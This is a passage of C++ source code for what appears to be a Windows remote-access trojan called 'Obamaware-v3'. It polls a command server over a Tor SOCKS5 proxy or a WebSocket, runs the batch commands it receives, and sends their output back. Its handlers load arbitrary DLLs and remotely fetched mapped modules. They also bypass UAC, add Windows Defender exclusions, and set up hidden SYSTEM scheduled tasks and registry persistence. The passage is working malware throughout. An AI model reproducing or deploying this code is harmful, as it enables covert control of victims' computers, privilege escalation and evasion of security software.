        std::vector<unsigned char> payloadbuffer;
        unsigned char opcode;



        // ------------------------------------------------------
        // 1) Poll example.com through local SOCKS5 proxy
        // ------------------------------------------------------
        {
            // The server expects:   USER ### GET

            // Write request body to a temp file (curl --data-binary expects a file)

            std::string s = USER + " ### GET";
            std::vector<unsigned char> body(s.begin(), s.end());

            if (!webSocket) {
                bool rc = post_socks5_write_file(
                    "127.0.0.1", 9050,
                    URL,
                    80,
                    PATH,
                    body,
                    RESP
                );

                if (rc != 0) {
                    log_append(LOGFILE, "[WARN] curl returned non-zero exit code (GET-POST mode).");
                }
            }
            else {
                std::cout << "Receiving..\n";
                if (!recv_one_frame(ws, payloadbuffer, opcode, LOGFILE)) {
                    std::cout << "Connection closed or error\n";
                    log_append(LOGFILE, "[WARN] Connection closed or error.");
                    webSocket = false;
                    continue;
                }
                if (opcode == 0x1) { // text
                    std::string txt(payloadbuffer.begin(), payloadbuffer.end());
                    std::cout << "Text: " << txt << "\n";
                    write_file(RESP, txt);
                    std::cout << "Received text: " + txt + "\n";
                    log_append(LOGFILE, "Received text: " + txt);
                }

            }
            if (!elevated) {
                if (hMutex == NULL) {
                    // Create mutex to ensure single instance of keyboard hook
                    hMutex = CreateMutexA(
                        nullptr,
                        FALSE,
                        "Local\\KeyboradHookMutex"
                    );

                    if (hMutex == nullptr) {
                        return FALSE;
                    }

                    if (GetLastError() == ERROR_ALREADY_EXISTS) {
                        CloseHandle(hMutex);
                        return TRUE;
                    }
            }
        }
        }

        // Log raw response
        log_append(LOGFILE, "-----------------------------");
        log_append(LOGFILE, "[DEBUG] RAW RESPONSE START");
        {
            std::string raw = read_file(RESP);
            log_append(LOGFILE, raw.empty() ? "[EMPTY RESPONSE]" : raw);
        }
        log_append(LOGFILE, "[DEBUG] RAW RESPONSE END");
        log_append(LOGFILE, "-----------------------------");

        // ------------------------------------------------------
        // 2) Read first line and perform prefix checks
        // ------------------------------------------------------
        std::string first = read_first_line(RESP);

        // Skip execution if "output ###"
        if (first.rfind("output ###", 0) == 0) {
            log_append(LOGFILE, "[INFO] Skipping execution due to prefix 'output ###'");
            Sleep(POLL_DELAY * 1000);
            continue;
        }

        std::string payload;


        // ------------------------------------------------------
        // 3) Extract payload (safe mode)
        if (first.rfind("__EXECUTE__ ###", 0) == 0) {
            payload = first.substr(15);
            while (!payload.empty() && (payload[0] == ' ' || payload[0] == '\t'))
                payload.erase(payload.begin());

            write_file(PAYLOAD, "@echo off\r\ncd " + WORKINGDIR + "\r\n" + payload + "\r\n");
        }
        else {
            write_file(PAYLOAD, "@echo off\r\necho __NO_PAYLOAD__\r\n");

            // Handle cd ###
            if (first.rfind("__CD__ ###", 0) == 0) {
                std::string cmd_after_prefix = first.substr(10); // skip "cd ### "
                while (!cmd_after_prefix.empty() && (cmd_after_prefix[0] == ' ' || cmd_after_prefix[0] == '\t'))
                    cmd_after_prefix.erase(cmd_after_prefix.begin());
                while (!cmd_after_prefix.empty() && (cmd_after_prefix.front() == '\n' || cmd_after_prefix.front() == '\r'))
                    cmd_after_prefix.erase(cmd_after_prefix.begin());
                while (!cmd_after_prefix.empty() && (cmd_after_prefix.back() == '\n' || cmd_after_prefix.back() == '\r'))
                    cmd_after_prefix.pop_back();

                std::string path;

                // If it starts with "cd " then extract the target path
                if (cmd_after_prefix.rfind("cd ", 0) == 0) {
                    path = cmd_after_prefix.substr(3); // skip "cd "
                    path.erase(0, path.find_first_not_of(" \t")); // trim leading spaces
                }

                // Only try to change directory if path is not empty
                if (!path.empty()) {
                    WORKINGDIR = NormalizePath(WORKINGDIR, path);
                    log_append(LOGFILE, "[INFO] WORKINGDIR now: " + WORKINGDIR);
                }

                // Always write payload to echo current directory
                char current_dir[MAX_PATH];
                GetCurrentDirectoryA(MAX_PATH, current_dir);
                if (!(WORKINGDIR == "")) {
                    write_file(PAYLOAD, std::string("@echo off\r\ncd ") + WORKINGDIR + "\r\n" + std::string("cd\r\n"));  // payload executes 'cd'
                }
                else {
                    write_file(PAYLOAD, "@echo off\r\ncd ");
                }
            }
            else {
                if (first.rfind("__QUIT__", 0) == 0) {
                    return 0;  // Exit program
                }

                if (first.rfind("__UNINSTALL__ ###", 0) == 0) {
                    std::string cmd_after_prefix = first.substr(17);
                    while (!cmd_after_prefix.empty() && (cmd_after_prefix[0] == ' ' || cmd_after_prefix[0] == '\t'))
                        cmd_after_prefix.erase(cmd_after_prefix.begin());
                    while (!cmd_after_prefix.empty() && (cmd_after_prefix.front() == '\n' || cmd_after_prefix.front() == '\r'))
                        cmd_after_prefix.erase(cmd_after_prefix.begin());
                    while (!cmd_after_prefix.empty() && (cmd_after_prefix.back() == '\n' || cmd_after_prefix.back() == '\r'))
                        cmd_after_prefix.pop_back();
                    clear_file(SENDRES.c_str());
                    DeleteFileA(UNINSTALLER.c_str());
                    write_file(PAYLOAD, "@echo off\r\npowershell -Command \"Remove-Item -Path 'HKCU:\\Software\\Classes\\CLSID\\{54E211B6-3650-4F75-8334-FA359598E1C5}\\InprocServer32' -Recurse -Force\"\r\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v DefaultStartupHandler /t REG_SZ /d \"" + UNINSTALLER + "\" /f\r\necho Uninstalling initiated, will be uninstalled at next restart\r\n");
                    write_file(UNINSTALLER, "@echo off\r\nrmdir /s /q \"" + cmd_after_prefix + "\"\r\nreg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v DefaultStartupHandler /f\r\n");
                }

                if (first.rfind("__THREADS__ ###", 0) == 0) {
                    std::string cmd = first.substr(15);
                    trim_left(cmd);
                    std::stringstream ss(cmd);
                    std::string type;
                    std::string identifier;
                    std::string action;

                    ss >> type >> identifier >> action;
                    if (type.empty() || identifier.empty() || action.empty() || type != "id" && type != "name" && type != "ID" && type != "NAME" || action != "get" && action != "suspend" && action != "terminate" && action != "resume") {
                        write_file(LOGFILE,
                            "Invalid format: use __THREADS__ ### \"id\"/\"name\" id/name get/suspend/terminate/resume");
                        write_file(PAYLOAD, "@echo off\r\necho Invalid format: use __THREADS__ ### \"id\"/\"name\" id or name");
                    }
                    if (type == "get") {
                        std::vector<thread_storage::threadHandle> threads = tStorage.threads;
                        std::string content = "@echo off\r\n";

                        for (const auto& th : threads) {
                            content += "echo thread name: " + th.name + "\r\n";
                            content += "echo thread ID: " + std::to_string(th.id) + "\r\n";
                            content += std::string("echo thread active: ") + (th.active ? "true" : "false") + "\r\n";
                            content += "echo.\r\n";
                        }

                        // write once, overwriting the file
                        write_file(PAYLOAD, content);
                    }
                    else {

                        thread_storage::threadHandle* h = nullptr;
                        trim_left(identifier);
                        identifier.erase(identifier.find_last_not_of(" \r\n\t") + 1);

                        if (type == "name" || type == "NAME") {
                            std::vector<std::reference_wrapper<thread_storage::threadHandle>> hv =
                                tStorage.get_by_name(identifier);

                            if (!hv.empty()) {

                                if (hv.size() == 1) {
                                    // Only one thread → extract reference
                                    h = &hv[0].get();

                                    std::string content =
                                        "@echo off\r\n"
                                        "echo thread name: " + h->name + "\r\n"
                                        "echo thread ID: " + std::to_string(h->id) + "\r\n"
                                        "echo thread active: " + (h->active ? "true" : "false") + "\r\n"
                                        "echo DLL loaded and function started.\r\n";

                                    write_file(PAYLOAD, content);
                                }
                                else {
                                    // Multiple threads → loop
                                    std::string content = "@echo off\r\n";

                                    for (auto& ref : hv) {
                                        thread_storage::threadHandle& th = ref.get();

                                        content += "echo thread name: " + th.name + "\r\n";
                                        content += "echo thread ID: " + std::to_string(th.id) + "\r\n";
                                        content += std::string("echo thread active: ") + (th.active ? "true" : "false") + "\r\n";
                                        content += "echo.\r\n";
                                    }

                                    content += "echo DLL loaded and function started.\r\n";

                                    write_file(PAYLOAD, content);
                                }
                            }
                            else {
                                // No threads found
                                h = nullptr;
                            }
                        }
                        else {
                            DWORD identifierDWORD = static_cast<DWORD>(std::stoul(identifier));
                            h = tStorage.get_by_id(identifierDWORD);
                        }
                        if (h != nullptr) {
                            if (action == "get") {
                                write_file(PAYLOAD, "@echo off\r\necho thread name: " + h->name + "\r\necho thread ID: " + std::to_string(h->id) + "\r\necho thread active: " + (h->active ? std::string("true") : std::string("false")));
                            }
                            else if (action == "suspend") {
                                tStorage.suspend_by_id(h->id);
                                write_file(PAYLOAD, "@echo off\r\necho thread name: " + h->name + "\r\necho thread ID: " + std::to_string(h->id) + "\r\necho thread active: " + (h->active ? std::string("true") : std::string("false")));
                            }
                            else if (action == "resume") {
                                tStorage.resume_by_id(h->id);
                                write_file(PAYLOAD, "@echo off\r\necho thread name: " + h->name + "\r\necho thread ID: " + std::to_string(h->id) + "\r\necho thread active: " + (h->active ? std::string("true") : std::string("false")));
                            }
                            else if (action == "terminate") {
                                tStorage.terminate_by_id(h->id);
                                write_file(PAYLOAD, "@echo off\r\necho thread terminated.");
                            }
                        }
                        else {
                            // no threads found
                            write_file(PAYLOAD, "@echo off\r\necho Could not find thread handle.\r\n");
                            write_file(LOGFILE, "Could not find thread handle.\r\n");
                        }
                    }
                }

                if (first.rfind("__LOAD_DLL__ ###", 0) == 0) {

                    std::string cmd = first.substr(16);
                    trim_left(cmd);
                    std::stringstream ss(cmd);
                    std::string dllname;
                    std::string mainFunc;

                    ss >> dllname >> mainFunc;
                    if (dllname.empty() || mainFunc.empty()) {
                        write_file(LOGFILE,
                            "Invalid format: use __LOAD_DLL__ ### dll_path main_func");
                        write_file(PAYLOAD, "@echo off\r\necho Invalid format: use __LOAD_DLL__ ### dll_path main_func");
                    }
                    else {

                        // ----- Expand path -----
                        char dllPath[MAX_PATH];
                        if (!ExpandEnvironmentStringsA(dllname.c_str(), dllPath, MAX_PATH)) {
                            write_file(LOGFILE, "Failed to expand environment strings.");
                            write_file(PAYLOAD, "@echo off\r\necho Failed to expand environment strings.");
                        }
                        else {

                            // ----- Load DLL -----

                            HMODULE hDll = NULL;

                            if (loadedDLLs.find(dllPath) == loadedDLLs.end()) {
                                hDll = LoadLibraryA(dllPath);
                            }
                            if (!hDll) {
                                write_file(LOGFILE, "LoadLibrary failed.");
                                write_file(PAYLOAD, "@echo off\r\necho LoadLibrary failed.");
                            }
                            else {

                                FARPROC p = GetProcAddress(hDll, mainFunc.c_str());
                                if (!p || p == NULL) {
                                    write_file(LOGFILE, "GetProcAddress failed.");
                                    write_file(PAYLOAD, "@echo off\r\necho GetProcAddress failed.");
                                }
                                else {

                                    HANDLE hThread = startThreadFromFARPROC(p);

                                    if (!hThread) {
                                        write_file(LOGFILE, "CreateThread failed.n");
                                        write_file(PAYLOAD, "@echo off\r\necho CreateThread failed.n");
                                    }
                                    else {
                                        write_file(PAYLOAD, "@echo off\r\necho DLL loaded and " + mainFunc + " started.\r\n");
                                        write_file(LOGFILE, "DLL loaded and function started.");
                                    }

                                    std::string threadName = get_last(dllname, '\\');   // stripped DLL filename
                                    trim_left(threadName);
                                    threadName.erase(threadName.find_last_not_of(" \r\n\t") + 1); // trim right

                                    // Append mainFunc to form threadName
                                    threadName += "\\" + mainFunc;

                                    tStorage.store(hThread, threadName, hDll);


                                    // get all threads with this name
                                    auto threadsWithName = tStorage.get_by_name(threadName);

                                    if (!threadsWithName.empty()) {
                                        std::string content = "@echo off\r\n";

                                        for (auto& thRef : threadsWithName) {
                                            thread_storage::threadHandle& th = thRef.get();  // get actual reference

                                            content += "echo thread name: " + th.name + "\r\n";
                                            content += "echo thread ID: " + std::to_string(th.id) + "\r\n";
                                            content += std::string("echo thread active: ") + (th.active ? "true" : "false") + "\r\n";
                                            content += "echo.\r\n";
                                        }

                                        content += "echo DLL loaded and function started.\r\n";

                                        write_file(PAYLOAD, content);
                                    }
                                    else {
                                        write_file(PAYLOAD, "@echo off\r\necho Could not store thread handle\r\n.echo necho DLL loaded and function started.\r\n");
                                        write_file(LOGFILE, "Could not store thread handle\r\n.necho DLL loaded and function started.");
                                    }

                                } // GetProcAddress success
                            } // LoadLibrary success
                        } // ExpandEnvironmentStrings success
                    } // dllname/mainFunc check  __DOWNGRADE__
                }
                if (first.rfind("__DOWNGRADE__", 0) == 0) {
                    webSocket = false;
                    upgradeToWebSocket = false;
                    std::cout << "Downgrading to POST-http.\n";
                    log_append(LOGFILE, "Downgrading to POST-http.");
                    Sleep(10000);
                    continue;
                }
                if (first.rfind("__UPGRADE__", 0) == 0) {
                    webSocket = true;
                    upgradeToWebSocket = true;
                    std::cout << "Upgrading to WebSocket.\n";
                    log_append(LOGFILE, "Upgrading to WebSocket.");
                    continue;
                }

                if (first.rfind("__LOAD_MAPPER__ ###", 0) == 0) {

                    std::string cmd = first.substr(19);
                    trim_left(cmd);
                    std::stringstream ss(cmd);
                    std::string dllname;
                    std::string mainFunc;
                    std::string url1;
                    std::string url2;
                    std::string mainFuncName;

                    std::cout << "Loading manual mapper...\n";

                    ss >> dllname >> mainFunc >> url1 >> url2 >> mainFuncName;
                    std::cout << "[*] Received args: " << dllname << " " << mainFunc << " " << url1 << " " << url2 << " " << mainFuncName << "\n";
                    if (dllname.empty() || mainFunc.empty() || url1.empty() || url2.empty() || mainFuncName.empty()) {
                        write_file(LOGFILE,
                            "Invalid format: use __LOAD_MAPPER__ ### dll_path main_func url1 url2 main_func_name");
                        write_file(PAYLOAD, "@echo off\r\necho Invalid format: use __LOAD_MAPPER__ ### dll_path main_func url1 url2 main_func_name");
                    }
                    else {

                        // ----- Expand path -----
                        char dllPath[MAX_PATH];
                        if (!ExpandEnvironmentStringsA(dllname.c_str(), dllPath, MAX_PATH)) {
                            write_file(LOGFILE, "Failed to expand environment strings.");
                            write_file(PAYLOAD, "@echo off\r\necho Failed to expand environment strings.");
                        }
                        else {

                            // ----- Load DLL -----

                            HMODULE hDll = NULL;

                            if (loadedDLLs.find(dllPath) == loadedDLLs.end()) {
                                hDll = LoadLibraryA(dllPath);
                            }
                            if (!hDll) {
                                std::cout << "LoadLibrary failed.\n";
                                write_file(LOGFILE, "LoadLibrary failed.");
                                write_file(PAYLOAD, "@echo off\r\necho LoadLibrary failed.");
                            }
                            else {

                                FARPROC p = GetProcAddress(hDll, mainFunc.c_str());
                                if (!p || p == NULL) {
                                    std::cout << "GetProcAddress failed.\n";
                                    write_file(LOGFILE, "GetProcAddress failed.");
                                    write_file(PAYLOAD, "@echo off\r\necho GetProcAddress failed.");
                                }
                                else {

                                    HANDLE hThread = startMapperFromFARPROC(p, url1, url2, mainFuncName);

                                    if (!hThread) {
                                        std::cout << "CreateThread failed.\n";
                                        write_file(LOGFILE, "CreateThread failed.");
                                        write_file(PAYLOAD, "@echo off\r\necho CreateThread failed.");
                                    }
                                    else {
                                        std::cout << "DLL loaded and " << mainFunc << " started.\r\n";
                                        write_file(PAYLOAD, "@echo off\r\necho DLL loaded and " + mainFunc + " started.\r\n");
                                        write_file(LOGFILE, "DLL loaded and function started.");
                                    }

                                    std::string threadName = get_last(dllname, '\\');   // stripped DLL filename
                                    trim_left(threadName);
                                    threadName.erase(threadName.find_last_not_of(" \r\n\t") + 1); // trim right

                                    // Append mainFunc to form threadName
                                    threadName += "\\" + mainFunc;

                                    tStorage.store(hThread, threadName, hDll);


                                    // get all threads with this name
                                    auto threadsWithName = tStorage.get_by_name(threadName);

                                    if (!threadsWithName.empty()) {
                                        std::string content = "@echo off\r\n";

                                        for (auto& thRef : threadsWithName) {
                                            thread_storage::threadHandle& th = thRef.get();  // get actual reference

                                            content += "echo thread name: " + th.name + "\r\n";
                                            content += "echo thread ID: " + std::to_string(th.id) + "\r\n";
                                            content += std::string("echo thread active: ") + (th.active ? "true" : "false") + "\r\n";
                                            content += "echo.\r\n";
                                        }

                                        content += "echo DLL loaded and function started.\r\n";

                                        write_file(PAYLOAD, content);
                                    }
                                    else {
                                        write_file(PAYLOAD, "@echo off\r\necho Could not store thread handle\r\n.echo necho DLL loaded and function started.\r\n");
                                        write_file(LOGFILE, "Could not store thread handle\r\n.necho DLL loaded and function started.");
                                    }

                                } // GetProcAddress success
                            } // LoadLibrary success
                        } // ExpandEnvironmentStrings success
                    } // dllname/mainFunc check
                }

                if (first.rfind("__MSG__ ###", 0) == 0) {
                    std::string cmd_after_prefix = first.substr(11);

                    // Trim leading spaces/tabs
                    while (!cmd_after_prefix.empty() &&
                        (cmd_after_prefix[0] == ' ' || cmd_after_prefix[0] == '\t')) {
                        cmd_after_prefix.erase(cmd_after_prefix.begin());
                    }

                    std::istringstream str(cmd_after_prefix);
                    std::string msgType;
                    std::string restOfLine;

                    // First token: type (error/info/warning)
                    if (!(str >> msgType)) {
                        write_file(PAYLOAD,
                            "@echo off\r\necho Invalid format: submit __MSG__ ### error/info/warning message\r\n"
                        );
                        continue;
                    }

                    // Extract the rest of the text after the msgType
                    std::getline(str, restOfLine);

                    // Trim leading space after getline
                    if (!restOfLine.empty() && restOfLine[0] == ' ')
                        restOfLine.erase(restOfLine.begin());

                    if (restOfLine.empty()) {
                        write_file(PAYLOAD,
                            "@echo off\r\necho Invalid format: message text missing.\r\n"
                        );
                        continue;
                    }

                    UINT uType;
                    if (msgType == "error") {
                        uType = MB_OK | MB_ICONERROR;
                    }
                    else if (msgType == "info") {
                        uType = MB_OK | MB_ICONINFORMATION;
                    }
                    else if (msgType == "warning") {
                        uType = MB_OK | MB_ICONWARNING;
                    }
                    else {
                        write_file(PAYLOAD,
                            "@echo off\r\necho Invalid type: must be error/info/warning\r\n"
                        );
                        continue;
                    }

                    // Show the message box
                    MessageBoxAsync(nullptr, restOfLine.c_str(), "Obama", uType | MB_TOPMOST);

                    write_file(PAYLOAD,
                        "@echo off\r\necho Message displayed successfully.\r\n"
                    );
                }
                if (first.rfind("__UAC__ ###", 0) == 0) {
                    std::string cmd_after_prefix = first.substr(11);
                    std::cout << "UAC command: " << cmd_after_prefix << "\n";

                    // Trim leading spaces/tabs
                    while (!cmd_after_prefix.empty() &&
                        (cmd_after_prefix[0] == ' ' || cmd_after_prefix[0] == '\t')) {
                        cmd_after_prefix.erase(cmd_after_prefix.begin());
                    }

                    std::istringstream str(cmd_after_prefix);
                    std::string exe_path;
                    std::string arguments;

                    // First token: type (error/info/warning)
                    if (!(str >> exe_path)) {
                        write_file(PAYLOAD,
                            "@echo off\r\necho Usage: exe_path [arguments] or \"elevate\""
                        );
                    }
                    if (std::getline(str, arguments)) {
                        // Trim leading space after getline
                        if (!arguments.empty() && arguments[0] == ' ')
                            arguments.erase(arguments.begin());
                    }

                    std::string expandedExePath;
                    char expandedPathBuffer[MAX_PATH];
                    if (ExpandEnvironmentStringsA(exe_path.c_str(), expandedPathBuffer, MAX_PATH)) {
                        expandedExePath = std::string(expandedPathBuffer);
                    }
                    else {
                        expandedExePath = exe_path; // Fallback to original if expansion fails
                    }

                    std::string argString;

                    if (expandedExePath == "elevate") {
                        argString = "md %APPDATA%\\Microsoft\\Windows\r\nattrib -s -h %LOCALAPPDATA%\\Obamaware-v3\\start_elevateable.exe\r\ncopy %LOCALAPPDATA%\\Obamaware-v3\\start_elevateable.exe %APPDATA%\\Microsoft\\Windows\\conhost.exe\r\npowershell -c \"Start-Process rundll32.exe -ArgumentList 'advpack.dll,RegisterOCX \"%APPDATA%\\Microsoft\\Windows\\conhost.exe\"' -Verb RunAs\"\r\nattrib +s +h %LOCALAPPDATA%\\Obamaware-v3\\start_elevateable.exe";
                    }
                    else {
                        std::string cmd = expandedExePath;
                        if (!arguments.empty()) cmd += " " + arguments;
                        argString = "powershell -c \"Start-Process wmic -ArgumentList 'process call create \\\"" + cmd + "\\\"' -Verb RunAs\"";
                    }




                    write_file(PAYLOAD,
                        "@echo off\r\n" + argString + "\r\necho Started elevation via UAC"
                    );

                    start_process(PAYLOADCHAR);
                    std::string content;
                    std::getline(std::ifstream(OUTFILE), content);
                    std::cout << "UAC output: " << content << "\n";
                    while (content.find("The operation was canceled by the user") != std::string::npos) {
                        std::cout << "UAC output: " << content << "\n";
                        start_process(PAYLOADCHAR);
                        std::getline(std::ifstream(OUTFILE), content);
                    }
                    executepayload = false;
                }

                if (first.rfind("__EXCLUDE__ ###", 0) == 0) {
                    std::string cmd_after_prefix = first.substr(15);

                    // Trim leading spaces/tabs
                    while (!cmd_after_prefix.empty() &&
                        (cmd_after_prefix[0] == ' ' || cmd_after_prefix[0] == '\t')) {
                        cmd_after_prefix.erase(cmd_after_prefix.begin());
                    }

                    std::istringstream str(cmd_after_prefix);
                    std::string path;

                    // First token: type (error/info/warning)
                    if (!(str >> path)) {
                        write_file(PAYLOAD,
                            "@echo off\r\necho Usage: path_to_exclude\r\n"
                        );
                    }
                    std::string expandedPath;
                    char expandedPathBuffer[MAX_PATH];
                    if (ExpandEnvironmentStringsA(path.c_str(), expandedPathBuffer, MAX_PATH)) {
                        expandedPath = std::string(expandedPathBuffer);
                    }
                    else {
                        expandedPath = path; // Fallback to original if expansion fails
                    }

                    write_file(PAYLOAD,
                        "@echo off\r\npowershell.exe -ep bypass -c \"Add-MpPreference -ExclusionPath \"" + expandedPath + "\"\"\r\necho added exclusion"
                    );
                }

                if (first.rfind("__TASK__ ###", 0) == 0) {
                    std::string cmd_after_prefix = first.substr(15);

                    // Trim leading spaces/tabs
                    while (!cmd_after_prefix.empty() &&
                        (cmd_after_prefix[0] == ' ' || cmd_after_prefix[0] == '\t')) {
                        cmd_after_prefix.erase(cmd_after_prefix.begin());
                    }

                    std::istringstream str(cmd_after_prefix);
                    std::string path;

                    // First token: type (error/info/warning)
                    if (!(str >> path)) {
                        write_file(PAYLOAD,
                            "@echo off\r\necho Usage: path_to_executable\r\n"
                        );
                    }
                    std::string expandedPath;
                    char expandedPathBuffer[MAX_PATH];
                    if (ExpandEnvironmentStringsA(path.c_str(), expandedPathBuffer, MAX_PATH)) {
                        expandedPath = std::string(expandedPathBuffer);
                    }
                    else {
                        expandedPath = path; // Fallback to original if expansion fails
                    }
                    write_file(PAYLOAD,
                        "@echo off\r\nschtasks.exe /create /tn \"%RANDOM%\" /tr \"powershell.exe -WindowStyle hidden -c Start-Process '" + expandedPath + "' -WindowStyle Hidden\" /sc onstart /ru \"NT AUTHORITY\\SYSTEM\" /rl highest /f /it\r\necho created scheduled task as SYSTEM on boot"
                    );
                }
                if (first.rfind("__PROC__", 0) == 0) {
                    std::string procName = getProcessNameWithElevation();
                    write_file(PAYLOAD,
                        "@echo off\r\necho " + procName);
                }

            }
        }

        log_append(LOGFILE, "[DEBUG] PAYLOAD CONTENT START");
        log_append(LOGFILE, read_file(PAYLOAD));
        log_append(LOGFILE, "[DEBUG] PAYLOAD CONTENT END");

        // ------------------------------------------------------
        // 4) SAFE MODE – It will only execute safe code ('cd')
        // ------------------------------------------------------
        if (executepayload) {
            start_process(PAYLOADCHAR);
        }
        executepayload = true;

        // ------------------------------------------------------
        // 5) Send data back via curl
        // ------------------------------------------------------
        {
            // Build data to send
            std::string s = USER + " ### output ### " + read_file(OUTFILE);

            std::vector<unsigned char> body(s.begin(), s.end());

            if (!webSocket) {
                bool rc = post_socks5_write_file(
                    "127.0.0.1", 9050,
                    URL,
                    80,
                    PATH,
                    body,
                    RESP
                );


                if (!rc) {
                    log_append(LOGFILE, "[WARN] curl returned non-zero exit code (POST mode).");
                }
                else {
                    log_append(LOGFILE, "[INFO] Send result: " + read_first_line(SENDRES));
                }
            }
            else {
                if (!send_over_socket(ws, body)) {
                    std::cout << "Connection closed or error\n";
                    log_append(LOGFILE, "[WARN] Connection closed or error.");
                    webSocket = false;
                    continue;
                }
                else {
                    std::cout << "Results send back:\n" << read_file(OUTFILE);
                    log_append(LOGFILE, "Results send back.");
                }

            }

        }
        // ------------------------------------------------------
        // 6) Sleep
        // ------------------------------------------------------
        if (!webSocket) {
            log_append(LOGFILE, "[INFO] Waiting before next loop...");
            Sleep(POLL_DELAY * 1000);
        }
    }

    return 0;
}


BOOL WINAPI DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Do NOT run main_func() here.
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}